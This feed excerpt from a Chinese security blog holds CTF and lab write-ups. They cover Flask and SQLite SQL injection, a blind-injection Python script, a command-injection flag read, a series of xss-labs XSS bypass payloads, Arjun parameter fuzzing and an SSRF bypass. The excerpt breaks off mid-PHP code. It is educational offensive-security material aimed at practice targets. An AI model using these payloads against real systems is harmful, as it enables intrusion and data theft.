class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python3</span><br><span class="line">import flask</span><br><span class="line">import sqlite3</span><br><span class="line"></span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line"></span><br><span class="line">def db_search(code):</span><br><span class="line">    with sqlite3.connect(&#x27;database.db&#x27;) as conn:</span><br><span class="line">        cur = conn.cursor()</span><br><span class="line">        cur.execute(f&quot;SELECT name FROM country WHERE code=UPPER(&#x27;&#123;code&#125;&#x27;)&quot;)</span><br><span class="line">        found = cur.fetchone()</span><br><span class="line">    return None if found is None else found[0]</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/&#x27;)</span><br><span class="line">def index():</span><br><span class="line">    return flask.render_template(&quot;index.html&quot;)</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/api/search&#x27;, methods=[&#x27;POST&#x27;])</span><br><span class="line">def api_search():</span><br><span class="line">    req = flask.request.get_json()</span><br><span class="line">    if &#x27;code&#x27; not in req:</span><br><span class="line">        flask.abort(400, &quot;Empty country code&quot;)</span><br><span class="line"></span><br><span class="line">    code = req[&#x27;code&#x27;]</span><br><span class="line">    if len(code) != 2 or &quot;&#x27;&quot; in code:</span><br><span class="line">        flask.abort(400, &quot;Invalid country code&quot;)</span><br><span class="line"></span><br><span class="line">    name = db_search(code)</span><br><span class="line">    if name is None:</span><br><span class="line">        flask.abort(404, &quot;No such country&quot;)</span><br><span class="line"></span><br><span class="line">    return &#123;&#x27;name&#x27;: name&#125;</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    app.run(debug=True)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>一个拥有几乎不可能绕过的waf的SQL注入题。</p><p>我们可以看到，这题是利用<code>flask.request.get_json()</code>进行传参，这个方法没有对传入的类型做检查。因此，我们可以传入非字符串类型的变量。</p><p>而在python中，当我们使用f-string直接传入非字符串参数时，就会被强转为字符串。</p><p>如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a=[1]</span><br><span class="line">print(f&#x27;111&#123;a&#125;&#x27;)</span><br><span class="line">输出：111[1]</span><br></pre></td></tr></table></figure><p>这也被称为<strong>python格式化字符串漏洞</strong>。</p><p>解法一：</p><p>因此，这题可以这样解：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;code&quot;:[&quot;1&#x27;) UNION SELECT FLAG FROM FLAG --&quot;,&quot;1&quot;]&#125;</span><br></pre></td></tr></table></figure><p>传入的code为列表，因而可以通过waf（len为2，没有<code>&#39;</code>元素）随后直接被f-string强转，拼入sql语句，如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT name FROM country WHERE code=UPPER(&#x27;[&quot;1&#x27;) UNION SELECT FLAG FROM FLAG --&quot;,&quot;1&quot;]&#x27;)</span><br></pre></td></tr></table></figure><p>就可以完成一次SQL注入。拿到FLAG表里的FLAG值。</p><h2 id="ezspl"><a href="#ezspl" class="headerlink" title="ezspl"></a>ezspl</h2><p>1.开局即登录，先<code>fuzz</code>看看ban了什么，发现空格、换行符、逗号，union等一堆内容被过滤了，本题主要用到两个：一是使用制表符代替空格，二是用<code>FROM</code>、<code>FOR</code>代替逗号；</p><p>2.判断下注入点，过程省略了，发现是<code>username</code>为字符型注入；</p><p>3.试试万能密码行不行1’%09or%091&#x3D;1%23，好消息是可以，坏消息是还有一层：</p><p>提示需要输入管理员密钥</p><p>4.显然还是要注入，利用布尔盲注直接爆，最后读到<code>secret: dtfrtkcc0czkoua9s</code>，输入后进入命令执行页面。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">def inject():</span><br><span class="line">    url = &#x27;http://gz.imxbt.cn:20011/login.php&#x27;</span><br><span class="line">    flag = &#x27;&#x27;</span><br><span class="line">    char = &#x27;qwertyuiopasdfghjkllzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM1234567890_&#x27;</span><br><span class="line"></span><br><span class="line">    for i in range(1, 50):</span><br><span class="line">        for j in char:</span><br><span class="line"></span><br><span class="line">            payload = f&quot;&#x27;or\tsubstr(database()from(&#123;i&#125;)for(1))=&#x27;&#123;j&#125;&#x27;#&quot;</span><br><span class="line">            # payload = f&quot;&#x27;or\tsubstr((select\tgroup_concat(table_name)from\tinformation_schema.tables\twhere\ttable_schema=&#x27;testdb&#x27;)from(&#123;i&#125;)for(1))=&#x27;&#123;j&#125;&#x27;#&quot;</span><br><span class="line">            # payload = f&quot;&#x27;or\tsubstr((select\tgroup_concat(column_name)\tfrom\tinformation_schema.columns\twhere\ttable_name=&#x27;double_check&#x27;)from(&#123;i&#125;)for(1))=&#x27;&#123;j&#125;&#x27;#&quot;</span><br><span class="line">            # payload = f&quot;&#x27;or\tsubstr((select\tgroup_concat(secret)\tfrom\tdouble_check)from(&#123;i&#125;)for(1))=&#x27;&#123;j&#125;&#x27;#&quot;</span><br><span class="line"></span><br><span class="line">            data = &#123;&quot;username&quot;: payload, &quot;password&quot;: ddd&#125;</span><br><span class="line">            r = requests.post(url=url, data=data)</span><br><span class="line">            # print(payload)</span><br><span class="line">            # print(r.text)</span><br><span class="line">            if &quot;检测到非法输入,已阻断!&quot; in r.text:</span><br><span class="line">                print(payload)</span><br><span class="line">                break</span><br><span class="line">            if &quot;帐号或密码错误&quot; not in r.text:</span><br><span class="line">                flag += j</span><br><span class="line">                print(flag)</span><br><span class="line">                break</span><br><span class="line"></span><br><span class="line">inject()</span><br></pre></td></tr></table></figure><p>5.无回显，还把空格ban了，直接重定向：<code>cat$&#123;IFS&#125;/flag.txt$&#123;IFS&#125;&gt;flag.txt</code>，然后看文件即可。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Signin&quot;&gt;&lt;a href=&quot;#Signin&quot; class=&quot;headerlink&quot; title=&quot;Signin&quot;&gt;&lt;/a&gt;Signin&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;来点真正的签到吧！&lt;/p&gt;
&lt;/blockquote&gt;
&lt;figure class</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>SQLite 数据库注入总结</title>
    <link href="http://1768161086.github,io/2025/04/05/sqlite/"/>
    <id>http://1768161086.github,io/2025/04/05/sqlite/</id>
    <published>2025-04-05T11:20:55.000Z</published>
    <updated>2025-04-25T11:18:09.013Z</updated>
    
    <content type="html"><![CDATA[<h1 id="SQLite-数据库注入总结"><a href="#SQLite-数据库注入总结" class="headerlink" title="SQLite 数据库注入总结"></a>SQLite 数据库注入总结</h1><p>注入show databases发现报错了，又因为show databases只在MySQL中存在，但是在SQLite中无法使用，所以判断为SQLite注入</p><p>注释：可以使用 – 进行注释，也可以使用 &#x2F;* 进行注释</p><h2 id="GHCTF2025WEB-SQL"><a href="#GHCTF2025WEB-SQL" class="headerlink" title="GHCTF2025WEB-SQL???"></a>GHCTF2025WEB-SQL???</h2><p>1.先order by判断有几列</p><p>2.爆出来表名</p><p>&#96;&#96;sqlite_master（相当于MySQL的information_schema）<code> 是 SQLite 中的一个系统表，它存储了数据库中所有对象（如表、视图、索引等）的定义信息。攻击者通过这个函数可以获取数据库中所有对象的名称。</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?id=1 union select 1,2,3,4,group_concat(name) from sqlite_master</span><br></pre></td></tr></table></figure><p> 在name这一列中是所包含的表的名字，也就是flag和users</p><p>3.查表名和列名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1 union select 1,2,(select sql from sqlite_master limit 0,1),4,5;</span><br><span class="line">/?id=1 union select 1,2,3,4,group_concat(sql) from sqlite_master</span><br></pre></td></tr></table></figure><p>4.查询数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 union select 1,2,(select group_concat(flag) from flag),4,5;</span><br></pre></td></tr></table></figure><p>官网wp：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select 1,2,3,sqlite_version(),(select group_concat(flag) from flag)--</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;SQLite-数据库注入总结&quot;&gt;&lt;a href=&quot;#SQLite-数据库注入总结&quot; class=&quot;headerlink&quot; title=&quot;SQLite 数据库注入总结&quot;&gt;&lt;/a&gt;SQLite 数据库注入总结&lt;/h1&gt;&lt;p&gt;注入show databases发现报错了，</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>xss</title>
    <link href="http://1768161086.github,io/2025/04/02/xss/"/>
    <id>http://1768161086.github,io/2025/04/02/xss/</id>
    <published>2025-04-02T12:44:42.000Z</published>
    <updated>2025-04-21T08:50:27.625Z</updated>
    
    <content type="html"><![CDATA[<h1 id="xss-labs靶场实战"><a href="#xss-labs靶场实战" class="headerlink" title="xss-labs靶场实战"></a>xss-labs靶场实战</h1><p><a href="https://so.csdn.net/so/search?q=xss-labs&spm=1001.2101.3001.7020">xss-labs</a>下载地址<a href="https://github.com/do0dl3/xss-labs" title="https:&#x2F;&#x2F;github.com&#x2F;do0dl3&#x2F;xss-labs">GitHub - do0dl3&#x2F;xss-labs: xss 跨站漏洞平台</a></p><h2 id="level-1"><a href="#level-1" class="headerlink" title="level 1"></a>level 1</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?name=&lt;script&gt;alert()&lt;/script&gt;</span><br></pre></td></tr></table></figure><h2 id="1-html实体转义"><a href="#1-html实体转义" class="headerlink" title="1.html实体转义"></a>1.html实体转义</h2><p>但是第二个没有，我们只需要闭合掉双引号即可，构造payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;  &lt;script&gt;alert()&lt;/script&gt;  &lt;&quot;</span><br></pre></td></tr></table></figure><h2 id="2-符号也被实体化"><a href="#2-符号也被实体化" class="headerlink" title="2.符号也被实体化"></a>2.符号也被实体化</h2><p>,但是htmlspecialchars函数只针对&lt;&gt;大于小于号进行html实体化，我们还可以利用其他方法进行xss注入，这里我们可以利用<strong>onfocus事件绕过</strong></p><p><code>onfocus事件在元素获得焦点时触发，最常与 &lt;input&gt;、&lt;select&gt; 和 &lt;a&gt; 标签一起使用，以上面图片的html标签&lt;input&gt;为例，&lt;input&gt;标签是有输入框的，简单来说，onfocus事件就是当输入框被点击的时候，就会触发myFunction()函数，然后我们再配合javascript伪协议来执行javascript代码</code></p><p>所以我们可以利用这个事件来绕过&lt;&gt;号的过滤已达到执行js的目的，构造payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; onfocus=javascript:alert() &#x27;</span><br></pre></td></tr></table></figure><h2 id="3-双引号闭合"><a href="#3-双引号闭合" class="headerlink" title="3.双引号闭合"></a>3.双引号闭合</h2><p><input>标签，所以我们还能继续利用onfocus事件，构建payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; onfocus=javascript:alert() &quot;</span><br></pre></td></tr></table></figure><h2 id="4-on被替换成了o-n"><a href="#4-on被替换成了o-n" class="headerlink" title="4.on被替换成了o_n"></a>4.on被替换成了o_n</h2><p>大小写无法来绕过过滤，使用href标签法</p><p>href属性的意思是 当标签<a>被点击的时候，就会触发执行转跳，上面是转跳到一个网站，我们还可以触发执行一段js代码</a></p><p>添加一个标签得闭合前面的标签，构建payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt; &lt;a href=javascript:alert()&gt;xxx&lt;/a&gt; &lt;&quot;</span><br></pre></td></tr></table></figure><h2 id="5-大小写没有被过滤"><a href="#5-大小写没有被过滤" class="headerlink" title="5.大小写没有被过滤"></a>5.大小写没有被过滤</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt; &lt;sCript&gt;alert()&lt;/sCript&gt; &lt;&quot;</span><br><span class="line">&quot; Onfocus=javascript:alert() &quot;</span><br><span class="line">&quot;&gt; &lt;a hRef=javascript:alert()&gt;x&lt;/a&gt; &lt;&quot;</span><br></pre></td></tr></table></figure><h2 id="6-禁用on，script，href"><a href="#6-禁用on，script，href" class="headerlink" title="6.禁用on，script，href"></a>6.禁用on，script，href</h2><p>所以这关主要是双拼写绕过，方法有很多，这里我们用href属性标签，构造play</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt; &lt;a hrehreff=javasscriptcript:alert()&gt;x&lt;/a&gt; &lt;&quot;</span><br></pre></td></tr></table></figure><h2 id="7-滤掉src和data"><a href="#7-滤掉src和data" class="headerlink" title="7.滤掉src和data"></a>7.滤掉src和data</h2><ul><li><strong>src</strong>(source)是一个指向，可以大概理解跟href一样把，只是执行的内容不太一样</li><li><strong>data</strong>一般在<iframe>标签中用来配合date:text&#x2F;html（貌似解码的含义）</iframe></li></ul><p>试一下src这里配合<strong>onerror属性</strong>，插入一个img标签闭合掉双引号跟括号，构造payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt; &lt;img src=&#x27;666&#x27; onerror=alert()&gt; &lt;&quot;</span><br></pre></td></tr></table></figure><p><code>onerror属性是指当图片加载不出来的时候触发js函数，以上面的代码为例，这里因为src指向的是值666，而不是图片的地址和base64编码啥的，就会导致触发alert函数</code></p><h3 id="img标签还有其他姿势"><a href="#img标签还有其他姿势" class="headerlink" title="img标签还有其他姿势"></a>img标签还有其他姿势</h3><h4 id="当鼠标移出图片的时候执行的属性onmouseout"><a href="#当鼠标移出图片的时候执行的属性onmouseout" class="headerlink" title="当鼠标移出图片的时候执行的属性onmouseout"></a>当鼠标移出图片的时候执行的属性<strong>onmouseout</strong></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt; &lt;img src=666 onmouseout=&quot;alert()&quot;&gt; &lt;&quot;</span><br></pre></td></tr></table></figure><h4 id="当鼠标移动到图片的时候执行的属性onmouseover"><a href="#当鼠标移动到图片的时候执行的属性onmouseover" class="headerlink" title="当鼠标移动到图片的时候执行的属性onmouseover"></a>当鼠标移动到图片的时候执行的属性<strong>onmouseover</strong></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt; &lt;img src=1 onmouseover=&quot;alert()&quot;&gt; &lt;&quot;</span><br></pre></td></tr></table></figure><p>再来看看data的，这里利用iframe标签，插入一个标签<strong>data:text&#x2F;html;base64,</strong> 将后面的内容进行base64解码，PHNjcmlwdD5hbGVydCgpPC9zY3JpcHQ+进行base64解码后是<script>alert()</script></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt; &lt;iframe src=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgpPC9zY3JpcHQ+&quot;&gt; &lt;&quot;</span><br></pre></td></tr></table></figure><h2 id="8-过滤双引号"><a href="#8-过滤双引号" class="headerlink" title="8.过滤双引号"></a>8.过滤双引号</h2><p>利用href的隐藏属性自动Unicode解码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#41; ==javascript:alert()</span><br></pre></td></tr></table></figure><h2 id="9-strpos绕过"><a href="#9-strpos绕过" class="headerlink" title="9.strpos绕过"></a>9.strpos绕过</h2><p>需要向传入的值里面添加http:&#x2F;&#x2F;并用注释符注释掉否则会执行不了无法弹窗，让函数strpos返回一个数字，构造payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#41;/* http:// */</span><br></pre></td></tr></table></figure><h2 id="10-过滤掉了号"><a href="#10-过滤掉了号" class="headerlink" title="10.过滤掉了&lt;&gt;号"></a>10.过滤掉了&lt;&gt;号</h2><p>用onfocus事件，因为这里输入框被隐藏了，需要添加type&#x3D;”text”，构造payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?t_sort=&quot; onfocus=javascript:alert() type=&quot;text</span><br></pre></td></tr></table></figure><p>构造一个http头</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Referer: &quot; onfocus=javascript:alert() type=&quot;text</span><br></pre></td></tr></table></figure><p>构造UA头</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; onfocus=javascript:alert() type=&quot;text</span><br></pre></td></tr></table></figure><p>伪造cookie头</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; onclick=alert() type=&quot;text </span><br></pre></td></tr></table></figure><h2 id="11-过滤JavaScript"><a href="#11-过滤JavaScript" class="headerlink" title="11.过滤JavaScript"></a>11.过滤JavaScript</h2><p>我们需通过<code>HTML</code>实体编码或<code>Unicode</code>绕过<br>因为浏览器会自动解码<code>HTML</code>实体或<code>Unicode</code>字符，最终执行原始代码。<br>构造<code>payload1</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">javascrip&amp;#x74;:alert(1)（`t`的十六进制编码，点击链接弹窗）</span><br><span class="line">构造payload2</span><br><span class="line">使用Unicode编码：</span><br><span class="line">javasc&amp;#x0072;ipt:alert(1)</span><br></pre></td></tr></table></figure><h2 id="12-过滤script标签"><a href="#12-过滤script标签" class="headerlink" title="12.过滤script标签"></a>12.过滤script标签</h2><p>但是可以包涵那些标签的东西比如<a>、<input>、img、<p>标签等等</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?src=&#x27;/level1.php?name=&lt;img src=1 onmouseover=alert()&gt;&#x27;</span><br></pre></td></tr></table></figure><p>当然也能用p标签，可以构造payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?src=&#x27;/level1.php?name=&lt;p onmousedown=alert()&gt;哈哈哈&lt;/p&gt;&#x27;</span><br></pre></td></tr></table></figure><h2 id="13-字母小写化-script替换成空格-最后将空格给实体化-给替换成了空格"><a href="#13-字母小写化-script替换成空格-最后将空格给实体化-给替换成了空格" class="headerlink" title="13.字母小写化,script替换成空格,最后将空格给实体化,&#x2F;给替换成了空格"></a>13.字母小写化,script替换成空格,最后将空格给实体化,&#x2F;给替换成了空格</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?keyword=&lt;svg%0Aonload=alert(1)&gt;</span><br></pre></td></tr></table></figure><h2 id="14-测试关键字"><a href="#14-测试关键字" class="headerlink" title="14.测试关键字"></a>14.测试关键字</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?arg01=&quot; &#x27; sRc DaTa OnFocus OnmOuseOver OnMouseDoWn P &lt;sCriPt&gt; &lt;a hReF=javascript:alert()&gt;; &amp;arg02=&quot; &#x27; sRc DaTa OnFocus OnmOuseOver OnMouseDoWn P &lt;sCriPt&gt; &lt;a hReF=javascript:alert()&gt;;</span><br></pre></td></tr></table></figure><p>将后端第十七关的代码（level17.php）指向的swf文件改为index.png</p><p>就有个embed标签的区域在啦，其实用不用swf文件都一样的，主要是区域，接着我们构造payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?arg02= onclick=alert()</span><br><span class="line">?arg02= onmousedown=alert()</span><br></pre></td></tr></table></figure><h2 id="15-实体化函数在无法闭合"><a href="#15-实体化函数在无法闭合" class="headerlink" title="15.实体化函数在无法闭合"></a>15.实体化函数在无法闭合</h2><p>往Flash里面插入一段js代码，然后手动执行嘛，构造payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?arg01=version&amp;arg02=&lt;a href=&quot;javascript:alert()&quot;&gt;here&lt;/a&gt;</span><br></pre></td></tr></table></figure><h2 id="16-反编译"><a href="#16-反编译" class="headerlink" title="16.反编译"></a>16.反编译</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?arg01=id&amp;arg02=xss\&quot;))&#125;catch(e)&#123;alert(1)&#125;//%26width=123%26height=123</span><br><span class="line">?arg01=id&amp;arg02=xss\&quot;))&#125;catch(e)&#123;alert(/xss/)&#125;//%26width%26height</span><br></pre></td></tr></table></figure></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;xss-labs靶场实战&quot;&gt;&lt;a href=&quot;#xss-labs靶场实战&quot; class=&quot;headerlink&quot; title=&quot;xss-labs靶场实战&quot;&gt;&lt;/a&gt;xss-labs靶场实战&lt;/h1&gt;&lt;p&gt;&lt;a href=&quot;https://so.csdn.net/s</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Arjun查询参数</title>
    <link href="http://1768161086.github,io/2025/04/02/Arjun%E6%9F%A5%E8%AF%A2%E5%8F%82%E6%95%B0/"/>
    <id>http://1768161086.github,io/2025/04/02/Arjun%E6%9F%A5%E8%AF%A2%E5%8F%82%E6%95%B0/</id>
    <published>2025-04-02T11:49:45.000Z</published>
    <updated>2025-04-02T12:00:35.761Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-Arjun是什么？"><a href="#1-Arjun是什么？" class="headerlink" title="1.Arjun是什么？"></a><strong>1.Arjun是什么？</strong></h2><p>Arjun 可以查找 URL 端点的查询参数。<a href="https://so.csdn.net/so/search?q=Web%20%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F&spm=1001.2101.3001.7020">Web 应用程序</a>使用参数（或查询）来接受用户输入，请考虑以下示例</p><p>url?id&#x3D;751634589</p><h2 id="2-项目安装"><a href="#2-项目安装" class="headerlink" title="2.项目安装"></a>2.项目安装</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/s0md3v/Arjun</span><br><span class="line">进入该目录执行：</span><br><span class="line">python3 setup.py install</span><br></pre></td></tr></table></figure><h2 id="3-快速使用"><a href="#3-快速使用" class="headerlink" title="3.快速使用"></a><strong>3.快速使用</strong></h2><h3 id="3-1-扫描单个网址"><a href="#3-1-扫描单个网址" class="headerlink" title="3.1.扫描单个网址"></a>3.1.扫描单个网址</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arjun -u https://api.example.com/endpoint</span><br></pre></td></tr></table></figure><h3 id="3-2-导入目标"><a href="#3-2-导入目标" class="headerlink" title="3.2.导入目标"></a>3.2.导入目标</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arjun -i targets.txt</span><br></pre></td></tr></table></figure><h3 id="3-3-指定-HTTP-方法"><a href="#3-3-指定-HTTP-方法" class="headerlink" title="3.3.指定 HTTP 方法"></a>3.3.指定 HTTP 方法</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">arjun -u https://api.example.com/endpoint -m POST</span><br><span class="line">所有可用的方法有：GET/POST/JSON/XML</span><br></pre></td></tr></table></figure><h3 id="3-4-导出结果"><a href="#3-4-导出结果" class="headerlink" title="3.4.导出结果"></a>3.4.导出结果</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">arjun -u https://api.example.com/endpoint -oJ result.json</span><br><span class="line">-oJ result.json</span><br><span class="line">-oT result.txt</span><br><span class="line">-oB 127.0.0.1:8080</span><br><span class="line">可以使用相应的选项将结果导出到 BurpSuite 或 txt/JSON 文件。</span><br></pre></td></tr></table></figure><h2 id="青少年CTF-穿梭隐藏的密钥"><a href="#青少年CTF-穿梭隐藏的密钥" class="headerlink" title="青少年CTF_穿梭隐藏的密钥"></a>青少年CTF_穿梭隐藏的密钥</h2><p>1.查看代码发现c3s4f.php目录</p><p>2.提示：多fuzzfuzz总能fuzz出点啥</p><p>3.这儿需要我们FUZZ出参数，使用工具<strong>Arjun</strong>（url参数扫描工具）查找</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arjun -u http://challenge.qsnctf.com:30268/c3s4f.php</span><br></pre></td></tr></table></figure><p>4.得到了参数shell，进行传参?shell&#x3D;123</p><p>5.发现应该是SSRF，直接构造(过滤了127.0.0.1)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?shell=http://localtest.me/secret.php</span><br></pre></td></tr></table></figure><p>6.我们得到了需要用到的KEY：MSIBLG ，并且得到下一关的地址cha11eng3.php</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">show_source(__FILE__);</span><br><span class="line">include(&#x27;k4y.php&#x27;);</span><br><span class="line">include_once(&#x27;flag.php&#x27;);</span><br><span class="line">// Challenge 1</span><br><span class="line">if (isset($_GET[&#x27;DrKn&#x27;])) &#123;</span><br><span class="line">    $text = $_GET[&#x27;DrKn&#x27;];</span><br><span class="line">    if(@file_get_contents($text) == $key) &#123;</span><br><span class="line">        echo &quot;有点东西呢&quot;.&quot;&lt;/br&gt;&quot;.$key1.&quot;&lt;/br&gt;&quot;;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        die(&quot;貌似状态不在线啊(╯_╰)&lt;/br&gt;&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br><span class="line">// Challenge 2</span><br><span class="line">if (isset($_GET[$key1])) &#123;</span><br><span class="line">    $damei = $_GET[$key1];</span><br><span class="line">    if (hash(&quot;md4&quot;, $damei) == $damei) &#123;</span><br><span class="line">        echo &quot;又近了一步呢，宝~&quot;.&quot;&lt;/br&gt;&quot;.$key2.&quot;&lt;/br&gt;&quot;.$key3;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        die(&quot;达咩哟~&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br><span class="line">// Challenge 3</span><br><span class="line">if (isset($_POST[$key2]) &amp;&amp; 